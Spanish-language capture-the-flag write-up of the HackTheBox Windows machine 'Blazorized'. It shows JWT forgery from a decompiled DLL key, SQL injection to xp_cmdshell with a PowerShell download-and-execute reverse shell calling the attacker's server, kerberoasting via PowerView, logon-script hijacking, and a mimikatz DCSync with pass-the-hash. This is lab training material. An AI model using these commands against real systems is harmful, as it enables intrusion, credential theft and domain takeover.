---
layout: post
title:  "Writeup Blazorized"
date:   2025-03-01 
categories: [Writeup, HackTheBox]
tags: [Windows, Dificil]
image: 
    path: /images/writeup-blazorized/1.png.png
---

***Dificultad: Dificil***

***Sistema Operativo: Windows***

hellou, una nueva maquina por hacer esta vez Windows que es el sistema mas usado en entornos empresariales.

como siempre, lo primero es crear los directorios de trabajo que usaremos para organizar hallazgos, exploits y demás:
```bash
mkdir blazorized && cd blazorized && mkdir nmap content exploits && cd nmap
```

lo primero, vamos a lanzar una traza icmp para comprobar que tenemos conexión a la misma:
```bash
ping -c1 10.10.10.10
```
podemos guardarlo como evidencia o punto de inicio para algún informe, pero en este caso no lo haremos, ya que es solo para verificar conectividad

es hora de saber que puertos expuestos tiene la ip y lo vamos a guardar por si necesitamos la información no lanzar de nuevo un escaneo:
```bash
nmap -p- --open -n -Pn -vvv --min-rate 3000 10.10.10.10 -oN allports
```
<img src="/images/writeup-blazorized/2.png" alt="image">

con estos puertos, parece un controlador de dominios de active directory además de un servicio web (antes que todo, lancemos los scripts básicos de reconocimiento de servicios de nmap)

para eso, usaremos el siguiente comando:
```bash
nmap -p53,80,88,135,139,389,445,464,593... -sCV -n -Pn 10.10.10.10 -oN targeteds
```
<img src="/images/writeup-blazorized/3.png" alt="image">

vemos que efectivamente es un DC, por donde empezar?

vemos que de primeras, el puerto 80 nos redirecciona a un dominio, así que vamos a agregarlo al /etc/hosts:
```bash
10.10.10.10       blazorized.htb
```
ahora, si visitamos la pagina:
<img src="/images/writeup-blazorized/4.png" alt="image">

vemos que la pagina ha sido creada con blazor webAssembly (de aquí el nombre de la maquina)

***blazor WebAssembly: es un framework moderno que permite construir paginas usando c#***

paseando un poco por la pagina, tenemos que en /check-updates hay un botón que envía una solicitud al servidor para ver o buscar actualizaciones (podemos ver luego el tipo de solicitud con Burpsuite)

tambien tenemos /markdown que refleja todo lo que escribamos de un lado, intente escribir algunos payload de xss, pero nada interesante, aunque tambien podríamos probar algo mas dado que blazor deja de lado JavaScript para solo usar c# (de momento nada interesante)

hay un post al que no podemos acceder /digital gardens y otro llamado misc. links

por el momento, podemos ver que viaja en esa solicitud de actualizaciones:
<img src="/images/writeup-blazorized/5.png" alt="image">

vemos que esta intentando acceder a un nombre de dominio que no apunta a ningún lado, entonces lo que haremos será agregarlo a la ip de la maquina en el /etc/hosts ***http://api.blazorized.htb

oooh, vemos que ahora tenemos acceso a las otras 2 publicaciones de la pagina:
<img src="/images/writeup-blazorized/6.png" alt="image">
<img src="/images/writeup-blazorized/7.png" alt="image">

ahora, después de pulsar el botón, vemos como se agregan nuevas cosas a la pagina:
<img src="/images/writeup-blazorized/8.png" alt="image">

mirando un poco, vemos que hay mucha información y guías, aparte de links a herramientas

mirando la actividad web que paso por el proxy de burpsuite, vemos que cada "articulo" se maneja como un dll

si leemos un poco sobre la documentación, este framework usa dlls para manejar toda la información, así que podemos analizarlos en búsqueda de datos, dado que Microsoft recomienda encarecidamente tener cuidado con la información que se maneja con los mismos, entonces vamos a buscar

investigando un poco, vemos que un archivo de configuracion importante es blazor.boot.json, asi que vamos a descargarlo en nuestra maquina para analiazarlo:

```bash
wget http://blazorized.htb/_framework/blazor.boot.json
```
ese archivo contiene los elementos principales que cargan la pagina, entonces para filtrar los dll que vamos a descargar para analizar, vamos a usar:
```bash
cat blazor.boot.json | grep 'System*' | cut -d':' -f1 | sed 's/System.//g' | sed '/s/"//g' > dlls
```
vamos a tener una lista de archivos y haremos un bucle para iterar sobre ella y descargarlos para analizarlos
```bash
for dll in $(cat dlls); do wget http://blazorized.htb/_framework/$dll; done
```
esto hará mucha traya, pero nos descargara todo en unos segundos

aunque luego de analizar todo , no encontramos nada interesante, asi que decidí volver al Burpsuite y ver si me había saltado algo y asi fue, cuando pulsamos el botón para que apareciera el contenido nuevo, se estaba enviando un token en base64 que al analizarlo con el decoder de bur, vemos que tiene información interesante sobe el email de un usuario:
<img src="/images/writeup-blazorized/9.png" alt="image"> 

superadmin@blazorized.htb

tambien leyendo un blog sobre la explotación de webs blazor, vemos que se nos recomienda el uso de una herramienta para leer los dlls de la pagina:
https://cyberar.io/blog/blazor-penetration-testing
la herramienta es: ILSPY un desensamblador para dlls o en caso de que lo hagas desde linux. avaloniailspy

aunque descargue los que estaban en el archivo .json todos tenían información irrelevante, pero en el burpsuite habían algunos mas y el que mas llama mi atención, ese ese que tiene el nombre de la pagina blazorized.helpers.dll
vamos a descargarlo y analizarlo con el https://github.com/icsharpcode/AvaloniaILSpy

es bastante fácil. primero debes instalar el dotnet en tu kali, luego vas a clonar el repositorio:
```
https://[https://dotnet.microsoft.com/en-us/download/dotnet](https://dotnet.microsoft.com/en-us/download/dotnet)
git clone https://github.com/icsharpcode/AvaloniaILSpy.git
```
entraras al repositorio y vas a ejecutar:
```bash
dotnet tool restore
dotnet cake
```
se va a crear un directorio artifacts, y debes entrar, alli ya ejecutaremos:
```bash
./ILSpy
```
allí vamos a navegar hasta el helper y vemos que hay data interesante:
<img src="/images/writeup-blazorized/10.png" alt="image">

vemos un nuevo dominio: admin.blazorized.htb y lo agregaremos al /etc/hosts

si analizamos las solicitudes que viajan en burpsuite, en el panel de administración:
<img src="/images/writeup-blazorized/21.png" alt="image">

no tenemos nada, haha pero, hay una herramienta en burpsuite para analizar trafico blazor:
<img src="/images/writeup-blazorized/22.png" alt="image">


dado la naturaleza de los paquetes de blazor, debemos seleccionar "filter settings" y agragar "other binary":
<img src="/images/writeup-blazorized/23.png" alt="image">

y veremos como aparecen otros paquetes type app:
<img src="/images/writeup-blazorized/24.png" alt="image">

ahora, eso lo enviaremos a la extensión que hemos añadido: click derecho > extensions > blazor trafic processor > send body to btp lap:
<img src="/images/writeup-blazorized/25.png" alt="image">

alli solo tenemos que desrealizar y veremos que información de utilidad podemos obtener de esos paquetes.

después de analizar varios, lo único relevante es que la aplicación busca un jwt almacenado en nuestro navegador para un inicio automático:
<img src="/images/writeup-blazorized/26.png" alt="image">

y tenemos un nuevo dominio con un panel de autenticación, además, tenemos mucha información sobre el jwt (la key, data adicional, etc)
<img src="/images/writeup-blazorized/11.png" alt="image">

que vamos a hacer? vemos que toda la evidencia que tenemos hasta el momento nos lleva a pensar que intentaremos entrar al panel con el jwt

1: vamos a capturar el jwt que tenemos al alcance que ya hemos visto desde burpsuite (cuando enviamos el update en la pagina principal):
<img src="/images/writeup-blazorized/12.png" alt="image">

2: vamos a analizarlo en la pagina https://jwt.io para poder usar la key encontrada o editarlo:
<img src="/images/writeup-blazorized/13.png" alt="image">

3: en ilspy vemos un valor que debe tener el token y tiene el mismo nombre de la pagina de administrador:
<img src="/images/writeup-blazorized/14.png" alt="image">

así que se lo vamos a añadir:
<img src="/images/writeup-blazorized/15.png" alt="image">

tambien usaremos el key que vemos en ilspy:
<img src="/images/writeup-blazorized/15.png" alt="image">

dado que el la key se usa para mantener la simetría y la valides de los jwt, para que los servidores lo puedan desrealizar correctamente:
<img src="/images/writeup-blazorized/16.png" alt="image">

ahora, si verificamos la fecha de caducidad:
<img src="/images/writeup-blazorized/17.png"alt="image">

ya esta caducado, pero solo necesitamos modificar la fecha porque tenemos la key:
<img src="/images/writeup-blazorized/18.png" alt="image">

como probamos si esto funciona?
vamos a ir al navegador, a la pagina del admin y agregaremos el token en storage - cookies:
<img src="/images/writeup-blazorized/19.png" alt="image">

al recargar la pagina no funciono, y recordé que habíamos leído que lo estaba buscando de manera local, así que al agregarlo y recargar la pagina:
<img src="/images/writeup-blazorized/20.png" alt="image">
logramos acceder al panel

ahora, lo que debemos hacer es empezar a enumerar la pagina, probar si se refleja algo, tenemos varias opciones para publicar en el blog

después de mirar e intentar varias cosillas, vemos que tenemos un #SQLinjection en el comparador de títulos duplicados:
<img src="/images/writeup-blazorized/27.png" alt="image">

como sabemos? pues dice que hay 13 títulos con el mismo nombre, o sea, esta seleccionando todos los títulos

tambien, si agregamos post, podremos ver que no los publica pero si los va almacenar en la base de datos 

que hacemos en estos cazos?

tengamos en cuenta, que la base de datos contiene el almacenamiento de la pagina, entonces, podemos intentar leer datos de ella? pero ya tenemos acceso al panel de administración, así que podemos buscar el modo de ejecutar comandos directamente en el servidor aprovechando la inyección:
https://www.tarlogic.com/es/blog/red-team-tales-0x01/
#SQLiToRCE
este blog lo encontramos buscando modos de ejecutar comandos a través de una inyección sql,
para probar si funciona, podemos levantar un servidor con python en nuestra maquina:
```bash
python3 -m http.server 80
```
y ejecutar en el campo de inyección:
```
' ; EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.10.10'; -- -
```
y vemos que ha funcionado, tenemos ejecución remota de comandos:
<img src="/images/writeup-blazorized/28.png" alt="image">
<img src="/images/writeup-blazorized/29.png" alt="image">

vamos a fabricar un payload que se descargue desde la maquina remota y se ejecute para que se nos envie una reverse shell. 

por que no ejecutar la reverse directamente desde el comprobador? porque ejecuta un comando solo por un instante, lo cual si nos consigue la shell, se caerá de inmediato, por lo que debemos mantenerla como un proceso de fondo en el sistema remoto.

para ello usaremos un comando de powershell que almacenaremos en un archivo en nuestro servidor y le daremos la orden de descarga y ejecución desde el buscador vulnerable:

para descargar y ejecutar al mismo tiempo (que sera el comando que ejecutaremos en el buscador vulnerable) vemos el siguiente recurso:
https://github.com/samratashok/nishang/blob/master/Execution/Download-Execute-PS.ps1

usaremos este comando en base64 por si hay alguna defensa activa (aunque en entornos totalmente reales, estos scripts son reconocidos fácilmente por el defender)
primero: vamos a guardar en un archivo el comando:
```powershell
Invoke-Expression ((New-Object Net.WebClient).DownloadString("http://10.10.10.10/script.ps1"))
```
vamos a ir a revshell.com y vamos a crear una reverseshell ejecutable en powershell en base64:
<img src="/images/writeup-blazorized/30.png" alt="image">

y la vamos a guardar en el archivo script.ps1

ahora, vamos a convertir el comando a base64 ejecutable tambien:
```bash
cat comando | iconv -t utf-16le | base64 -w0; echo
```
lo convertirá a little endian utf-16 que es el tipo de codificación en base64 que se usa para que powershell pueda ejecutarlo directamente

ya con todo esto, vamos a montar nuestro servidor de python en el directorio donde se encuentra nuestro script.ps1 y tambien vamos a levantar a nc con rlwrap en el puerto indicado:
```bash
python3 -m http.server 80
```
```
rlwrap nc -lnvp 9001
```

ahora, vamos a ejecutar en el buscador vulnerable el comando de descarga/ejecucion:

```
'; EXEC xp_cmdshell 'powershell -e SQB....';-- -
```
y: 
<img src="/images/writeup-blazorized/31.png" alt="image">

vamos a ir al directorio del usuario que somo actualmente, y allí tendremos la primera flag de usuario:
```powershell
cd C:\Users\nu_105\Desktop
type user.txt
```

## escalada de privilegios

sabemos hasta el momento que esta en una maquina de directorio activo, así que debemos ver las rutas de escalada, vectores de ataque y posibles conexiones, para eso recolectaremos información en la maquina comprometida con *sharphound.exe* (en entornos reales esta herramienta puede ser detectada y desatar alertas por ciertos eventos generados por la misma, una de esas herramientas que podría detectarlo seria *Wazuh*)aunque en los ctf's y entornos controlados o ciertas situaciones, esta bien usarla

 este es un complemento de la herramienta bloodhound:
 una herramienta especializada para pentesting a servidores de active directory muy visual que  muestra la relación entre múltiples objetos del servidor
 puedes ver mas de la misma en:
 https://seguridadinformaticaactual.com/2021/07/18/bloodhound-herramienta-para-hacer-pentesting-a-un-servidor-de-active-directory/

podemos descargar el ejecutable con:
```bash
wget https://github.com/SpecterOps/SharpHound/releases/download/v2.5/SharpHound-v2.5.13-debug.zip
```
y vamos a enviarlo a la maquina comprometida, levantando de nuevo un servidor de python donde esta el archivo y usando en el otro equipo:
```powershell
wget http://10.10.10.10/SharpHound.exe -o sharphound.exe
```

debemos descargarlo en la carpeta oculta de windows *Programdata* ya que desde Temp no ejecuta nada

ahora lo usamos con:
```powershell
.\sharphound.exe -c all
```

luego de eso, tendremos como resultado un archivo ..._BloodHound.zip, debemos pasarlo a nuestro equipo

vamos a levantar un servidor smb en nuestro equipo:
```bash
impacket-smbserver smbFolder . --smb2support -username test -password test
```
y en la maquina victima:
```powershell
net use \\10.10.10.10 -user:test test
copy *.zip \\10.10.10.10\smbFolder
```
para dejar los archivos listos para usar, descomprime el archivo zip.

hora de ejecutar bloodhound:
```bash
sudo neo4j console
```
si es primera vez, vas a ir a localhost:7474 y configurar tu user/password

y en otra terminal:
```bash
bloodhound
```
desplegara una ventana en la cual vas a iniciar sesión con las credenciales que haz configurado:
<img src="/images/writeup-blazorized/32.png" alt="image">

dentro de la aplicación, vas a cargar todos los archivos excepto**...computers.json** en mi caso porque se traba toda la carga de archivos, pero realmente no lo necesitamos
<img src="/images/writeup-blazorized/33.png" alt="image">

buscaremos al usuario comprometido: nu_1055
<img src="/images/writeup-blazorized/34.png" alt="image">

vamos a seleccionarlo como comprometido:
<img src="/images/writeup-blazorized/35.png" alt="image">

ya podemos buscar información basados en ese nodo comprometido.
iremos a "Node Info"

buscando un poco, vemos que es miembro de varios grupos, así como los roles que tiene asignado (nada interesante)

si buscamos mas, vemos que en "outbound object control" o sea: objeto sobre el cual tiene capacidad de controlar fuera de su propio ámbito tiene un permiso tipo "first degree object control" lo que significa que el usuario puede realizar acciones como modificar contraseñas o atributos del usuario que nos señala en la grafica:
<img src="/images/writeup-blazorized/36.png" alt="image">

mirando mas a detalle, tenemos el permiso *writeSPN* lo que nos permitiria modificar los *service principal names* asociados a la cuenta que son los identificadores para la autenticación #kerberos 

la misma aplicación nos resume de que se trata este permiso y como podemos abusarlo en entornos windows:
<img src="/images/writeup-blazorized/37.png" alt="image">

mirando el modo de abusar de esto en windows, vemos que se nos sugiere un #kerberoastingAtack usando el comando set-domainObject de powerview y luego get-domainspnticket para recibir un ticket del servicio kerberos

si logramos capturar el ticket, podremos intentar desencriptarlo con jhon o hashcat

como procedemos?:

aunque lo estaba intentando sin el uso de #powerview, lamentablemente no se como extraer el ticket que he almacenado en la cache o en el caso de powerview, solicitar un ticket y formatearlo a modo de hash, aunque es posible, es un tanto complejo que nos hará alejarnos del principal propósito de la maquina pero a futuro (podemos hacer un script que automatice la extracción de esto, para que sea mas discreto y podamos usarlo)

el binario podemos encontrarlo en:
```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1

chmod +x PowerView.ps1

python3 -m http.server 80
```

vamos a subir powerview a la maquina victima en la carpeta *Programdata*:
```powershell
wget http://10.10.10.10/powerview.ps1 -o powerview.ps1
```

vamos a importar el modulo:
```powershell
. .\powerview.ps1
```
ejecutaremos el siguiente comando:
```powershell
Set-DomainObject -Identity RSA_4810 -Set @{serviceprincipalname='3vilsec/PWNED'}
```
estamos llamando a una propiedad de powerview que se utiliza para modificar propiedades de un objeto, le especificamos la identidad y que lo que se quiere modificar el serviceprincipalname que es la propiedad vista en bloodhound sobre la cual tenemos control 

dato(quisiera probar a extraer el ticket sin modificar la propiedad, para saber si de igual modo funciona y no levantar alarmas en un entorno real donde no ser requieran redirecciones)

luego para el hash formateado usaremos:
```powershell
Get-DomainUser RSA_4810 | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
```
y a aqui, estamos pasando el usuario y solicitando el ticket a kerberos, toma el resultado y selecciona la propiedad hash del objeto que contiene el ticket 

lo que nos queda por hacer es guardar el hash en un archivo en nuestra maquina para hacerle fuerza bruta:
```bash
hashcat hash.txt /usr/s.../rockyou.txt
```
<img src="/images/writeup-blazorized/38.png" alt="image">

vemos que la contrasena es: (Ni7856Do9854Ki05Ng0005 #)

tenemos unas nuevas credenciales y vamos a probarlas con la herramienta #netexec para saber si son validas antes de intentar una entrada
```bash
netexec winrm blazorized.htb -u RSA_4810 -p "(Ni...)"
```

si vemos "(Pwn3d )" podemos usar evil-winrm para conectarnos como el nuevo usuario:
```bash
evil-winrm -u RSA_4810 -p "(Ni...)" -i 10.10.10.10
```

como este usuario, podemos buscar que permisos o acciones interesantes podemos hacer para seguir haciendo movimientos laterales (porque aun no somos admins)

para ello, aprovechando la herramienta que ya se encuentra en la maquina iremos a "C:\Programdata" y usaremos el comado:
```powershell
. ./powerview.ps1
```
para traer de nuevo el modulo y:
```powershell
Find-InterestingDomainAcl -ResolveGUIDS | ?{$_.IdentityReferenceName -match "RSA_4810"}
```
esto va a buscar configuraciones interesantes o permisos especiales que tenga nuestro nuevo usuario

lo mas interesante es el permiso *ObjectAceType : script-Path*

en un entorno de active directory, este atributo se refiere a los permisos que nos permite modificar la ruta del script de inicio de sesión de otro usuario

ahora, queremos averiguar, que script se esta usando para iniciar sesión y que usuario podemos abusar

para el usuario, he vuelto a bloodhound, y he buscado por los grupos a los que pertenece el usuario ya comprometido, y verificar que otro usuario esta en el:
viendo por el grupo *REMOTE_SUPPORT_ADMINISTRATORS* no vemos que otros usuarios pertenecientes tengan otras conexiones interesantes

si vemos el grupo *REMOTE MANAGEMENT USERS* y miramos los "groups members" > "direct members" hay un usuario mas adicional a los ya comprometidos: *SSA_6010* e investigando a este usuario, es el punto final para poder comprometer el DC:
<img src="/images/writeup-blazorized/40.png" alt="image">

ya tenemos el objetivo, como sabemos cual es el script del que vamos a abusar?

ya que estamos buscando un script compartido, y tenemos credenciales validas, podemos hacer uso del smb y ver si hay alguna pista alli del recurso compartido entre estos usuarios:

podemos usar de nuevo la herramienta #netexec con el siguiente comando:
```bash
netexec smb 10.10.10.10 -u rsa_4810 -p "(Ni...)"
```
el nombre de usuario en minusculas
<img src="/images/writeup-blazorized/41.png" alt="image">

tenemos una carpeta compartida llamado *sysvol* que a sus ves si somos curiosos, vemos que se encuentra en C:/windows/
<img src="/images/writeup-blazorized/42.png" alt="image">

dentro de la ruta C:/Windows/SYSVOL/domain/scripts encontramos lo bueno
son los scripts de inicio de sesión

y usando el comando:
```powershell
icacls *
```
vemos la información de los mismos y veremos que hay uno sobre el cual nuestro usuario tiene control total

<img src="/images/writeup-blazorized/43.png" alt="image">

tambien vemos podemos ver los mismos scripts en la ruta C:/Windows/SYSVOL/sysvol/blazorized.htb/scripts

entrando en el directorio del que tenemos control, vemos el archivo .bat el cual sirve para los inicios de sesión

## la jugada:

vamos a editar el archivo bat, para que el usuario descargue el archivo malicioso desde nuestro servidor, que ejecute la reverse shell y nos la envíe a nuestra maquina de atacante.

normalmente en estos casos de los ctf's estos usuarios estan programados para ejecutar esos scripts vulnerables cada cierta cantidad de tiempo pero si lo quieres validar, puedes usar:

```powershell
[DateTime]::FromFileTime((Get-ADUser SSA_6010 -properties LastLogon).LastLogon)
```
y puedes repetirlo las veces que desees para validar

***Convertir una reverseshell en un archivo .bat***

vamos a usar nuestra reverse shell de la pagina revshells.com pero recuerda cambiar el puerto o cerrar la sesion que tienes con rlwrap

yo voy a aprovechar la reverse shell ya creada y cerrare la sesion con el primer usuario comprometido (porque a esta altura no nos sirve de nada)

usaremos el mismo comando que usamos en la inyeccion slq para convertir el comando de descarga en base64 ejecutable por powershell
```bash
cat comando | iconv -t utf-16le | base64 -w0; echo
```
y vamos a guardarlo en un archivo con extension .bat en la maquina comprometida con el usuario 4810
```powershell
echo 'powershell -e SQ...' | Out-File -FilePath 3vilsec.bat -Encoding ASCI
```
teniendo esto, vamos a insertar el "nuevo" script de inicio en el usuario:
```powershell
Set-ADUser -Identity SSA_6010 -ScriptPath "A32...\3vilsec.bat"
```
*ten en cuenta que debes tener el servidor python donde tienes la reverse shell y rlwrap con nc en escucha*:
```bash
python3 -m http.server 80
```
```bash
rlwrap nc -lnvp 9001
```
<img src="/images/writeup-blazorized/44.png" alt="image">

## Jugada Final:

en bloodhound tenemos lo que necesitamos basado en los permisos de este usuario:

<img src="/images/writeup-blazorized/45.png" alt="image">

necesitamos #mimikatz para exfiltrar las credenciales de administrador

vamos a descargarlo: https://github.com/ParrotSec/mimikatz/tree/master/x64
y en la carpeta de descarga abriremos de nuevo un servidor python:
```bash
python3 -m http.server 80
```
y vamos a descargarlo en programdata con el nuevo usuario:
```powershell
wget http://10.10.10.10/mimikatz.exe -o mimikatz.exe
```
y usaremos el comando:
```powershell
.\mimikatz.exe "lsadump::dcsync /user:administrator" exit
```
 y eso nos devuelve un hash  ntlm que usaremos para iniciar sesión como administrador:
<img src="/images/writeup-blazorized/46.png" alt="image">

copiaremos y en nuestra maquina usaremos de nuevo *evil-winrm*
```bash
evil-wirm -i 10.10.10.10 -u administrator -H f55.....
```

lo conseguimos:
<img src="/images/writeup-blazorized/47.png" alt="image">
ahora, podemos buscar la flag en el directorio "Desktop" del admin




## Conclusiones:

Esta maquina, esta enfocada en vulnerar un DC de directorio activo, esta claro que no estará expuesta en internet, y un objetivo de este estilo en el mundo real, seria encontrado después de pivotar y comprometer una red interna.

sin embargo, es perfecta para practicar uno de los ataques mas comunes a la hora de comprometer a los usuarios con mas privilegios en el dominio, tambien aprovechar pequeñas configuraciones.

por esa razón, son importantes las constantes auditorias a los sistemas, aunque estén aislados del exterior.


nos vemos en la siguiente maquina! 

## H4ck th3 W0rld

<img src="/images/devil.jpg" style="border-radius:200px; width:100px;" alt="image">